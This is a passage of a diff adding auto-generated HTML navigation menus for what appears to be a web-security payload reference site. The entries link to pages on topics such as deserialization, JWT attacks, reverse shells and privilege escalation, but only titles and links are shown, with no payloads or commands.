+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File%20Inclusion/" class="md-nav__link">
+        File Inclusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_20" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_20" id="__nav_20_label" tabindex="0">
+          GraphQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_20_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_20">
+          <span class="md-nav__icon md-icon"></span>
+          GraphQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL%20Injection/" class="md-nav__link">
+        GraphQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_21" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_21" id="__nav_21_label" tabindex="0">
+          HTTP Parameter Pollution
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_21_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_21">
+          <span class="md-nav__icon md-icon"></span>
+          HTTP Parameter Pollution
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTTP%20Parameter%20Pollution/" class="md-nav__link">
+        HTTP Parameter Pollution
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_22" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_22" id="__nav_22_label" tabindex="0">
+          Insecure Deserialization
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_22_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_22">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Deserialization
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/" class="md-nav__link">
+        Insecure Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/DotNET/" class="md-nav__link">
+        .NET Serialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Java/" class="md-nav__link">
+        Java Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Node/" class="md-nav__link">
+        Node Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/PHP/" class="md-nav__link">
+        PHP Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Python/" class="md-nav__link">
+        Python Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Ruby/" class="md-nav__link">
+        Ruby Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/YAML/" class="md-nav__link">
+        YAML Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_23" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_23" id="__nav_23_label" tabindex="0">
+          Insecure Direct Object References
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_23_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_23">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Direct Object References
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Direct%20Object%20References/" class="md-nav__link">
+        Insecure Direct Object References
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_24" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_24" id="__nav_24_label" tabindex="0">
+          Insecure Management Interface
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_24_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_24">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Management Interface
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Management%20Interface/" class="md-nav__link">
+        Insecure Management Interface
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_25" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_25" id="__nav_25_label" tabindex="0">
+          Insecure Randomness
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_25_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_25">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Randomness
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Randomness/" class="md-nav__link">
+        Insecure Randomness
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_26" id="__nav_26_label" tabindex="0">
+          Insecure Source Code Management
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_26_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_26">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Source Code Management
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Source%20Code%20Management/" class="md-nav__link">
+        Insecure Source Code Management
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_27" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_27" id="__nav_27_label" tabindex="0">
+          JSON Web Token
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_27_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_27">
+          <span class="md-nav__icon md-icon"></span>
+          JSON Web Token
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          JWT - JSON Web Token
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        JWT - JSON Web Token
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    Tools
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt-format" class="md-nav__link">
+    JWT Format
+  </a>
+  
+    <nav class="md-nav" aria-label="JWT Format">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#header" class="md-nav__link">
+    Header
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    Payload
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt-signature" class="md-nav__link">
+    JWT Signature
+  </a>
+  
+    <nav class="md-nav" aria-label="JWT Signature">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signature-null-signature-attack-cve-2020-28042" class="md-nav__link">
+    JWT Signature - Null Signature Attack (CVE-2020-28042)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signature-disclosure-of-a-correct-signature-cve-2019-7644" class="md-nav__link">
+    JWT Signature - Disclosure of a correct signature (CVE-2019-7644)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signature-none-algorithm-cve-2015-9235" class="md-nav__link">
+    JWT Signature - None Algorithm (CVE-2015-9235)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signature-key-confusion-attack-rs256-to-hs256-cve-2016-5431" class="md-nav__link">
+    JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signature-key-injection-attack-cve-2018-0114" class="md-nav__link">
+    JWT Signature - Key Injection Attack (CVE-2018-0114)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt-secret" class="md-nav__link">
+    JWT Secret
+  </a>
+  
+    <nav class="md-nav" aria-label="JWT Secret">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#encode-and-decode-jwt-with-the-secret" class="md-nav__link">
+    Encode and Decode JWT with the secret
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#break-jwt-secret" class="md-nav__link">
+    Break JWT secret
+  </a>
+  
+    <nav class="md-nav" aria-label="Break JWT secret">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jwt-tool" class="md-nav__link">
+    JWT tool
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hashcat" class="md-nav__link">
+    Hashcat
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt-claims" class="md-nav__link">
+    JWT Claims
+  </a>
+  
+    <nav class="md-nav" aria-label="JWT Claims">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jwt-kid-claim-misuse" class="md-nav__link">
+    JWT kid Claim Misuse
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jwks-jku-header-injection" class="md-nav__link">
+    JWKS - jku header injection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#labs" class="md-nav__link">
+    Labs
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_28" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_28" id="__nav_28_label" tabindex="0">
+          Java RMI
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_28_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_28">
+          <span class="md-nav__icon md-icon"></span>
+          Java RMI
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Java%20RMI/" class="md-nav__link">
+        Java RMI
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_29" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_29" id="__nav_29_label" tabindex="0">
+          Kubernetes
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_29_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_29">
+          <span class="md-nav__icon md-icon"></span>
+          Kubernetes
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Kubernetes/" class="md-nav__link">
+        Kubernetes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_30" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_30" id="__nav_30_label" tabindex="0">
+          LDAP Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_30_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_30">
+          <span class="md-nav__icon md-icon"></span>
+          LDAP Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../LDAP%20Injection/" class="md-nav__link">
+        LDAP Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_31" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_31" id="__nav_31_label" tabindex="0">
+          LaTeX Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_31_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_31">
+          <span class="md-nav__icon md-icon"></span>
+          LaTeX Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../LaTeX%20Injection/" class="md-nav__link">
+        LaTex Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_32" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_32" id="__nav_32_label" tabindex="0">
+          Mass Assignment
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_32_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_32">
+          <span class="md-nav__icon md-icon"></span>
+          Mass Assignment
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Mass%20Assignment/" class="md-nav__link">
+        Mass Assignment
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_33" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_33" id="__nav_33_label" tabindex="0">
+          Methodology and Resources
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_33_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_33">
+          <span class="md-nav__icon md-icon"></span>
+          Methodology and Resources
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Active%20Directory%20Attack/" class="md-nav__link">
+        Active Directory Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/" class="md-nav__link">
+        Bind Shell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/" class="md-nav__link">
+        Cloud - AWS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/" class="md-nav__link">
+        Cloud - Azure
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/" class="md-nav__link">
+        Cobalt Strike
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/" class="md-nav__link">
+        Container - Docker Pentest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Container%20-%20Kubernetes%20Pentest/" class="md-nav__link">
+        Container - Kubernetes Pentest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Escape%20Breakout/" class="md-nav__link">
+        Application Escape and Breakout
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/HTML%20Smuggling/" class="md-nav__link">
+        HTML Smuggling
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Hash%20Cracking/" class="md-nav__link">
+        Hash Cracking
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Linux%20-%20Evasion/" class="md-nav__link">
+        Linux - Evasion
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Linux%20-%20Persistence/" class="md-nav__link">
+        Linux - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Linux - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/" class="md-nav__link">
+        MSSQL Server
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/" class="md-nav__link">
+        Metasploit
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Methodology%20and%20enumeration/" class="md-nav__link">
+        Bug Hunting Methodology and Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Miscellaneous%20-%20Tricks/" class="md-nav__link">
+        Miscellaneous & Tricks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Network%20Discovery/" class="md-nav__link">
+        Network Discovery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Network%20Pivoting%20Techniques/" class="md-nav__link">
+        Network Pivoting Techniques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Office%20-%20Attacks/" class="md-nav__link">
+        Office - Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/" class="md-nav__link">
+        Powershell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/" class="md-nav__link">
+        Reverse Shell Cheat Sheet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Source%20Code%20Management/" class="md-nav__link">
+        Source Code Management & CI/CD Compromise
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Subdomains%20Enumeration/" class="md-nav__link">
+        Subdomains Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/" class="md-nav__link">
+        AMSI Bypass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20DPAPI/" class="md-nav__link">
+        Windows - DPAPI
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Defenses/" class="md-nav__link">
+        Windows - Defenses
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/" class="md-nav__link">
+        Windows - Download and execute methods
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Mimikatz/" class="md-nav__link">
+        Windows - Mimikatz
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Persistence/" class="md-nav__link">
+        Windows - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Windows - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Using%20credentials/" class="md-nav__link">
+        Windows - Using credentials
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_34" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_34" id="__nav_34_label" tabindex="0">
+          NoSQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_34_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_34">
+          <span class="md-nav__icon md-icon"></span>
+          NoSQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20Injection/" class="md-nav__link">
+        NoSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_35" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_35" id="__nav_35_label" tabindex="0">
+          OAuth Misconfiguration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_35_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_35">
+          <span class="md-nav__icon md-icon"></span>
+          OAuth Misconfiguration
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OAuth%20Misconfiguration/" class="md-nav__link">
+        OAuth Misconfiguration
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_36" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_36" id="__nav_36_label" tabindex="0">
+          Open Redirect
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_36_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_36">
+          <span class="md-nav__icon md-icon"></span>
+          Open Redirect
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Open%20Redirect/" class="md-nav__link">
+        Open URL Redirection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_37" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_37" id="__nav_37_label" tabindex="0">
+          Prompt Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_37_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_37">
+          <span class="md-nav__icon md-icon"></span>
+          Prompt Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prompt%20Injection/" class="md-nav__link">
+        Prompt Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_38" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_38" id="__nav_38_label" tabindex="0">
+          Prototype Pollution
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_38_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_38">
+          <span class="md-nav__icon md-icon"></span>
+          Prototype Pollution
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prototype%20Pollution/" class="md-nav__link">
+        Prototype Pollution
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_39" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_39" id="__nav_39_label" tabindex="0">
+          Race Condition
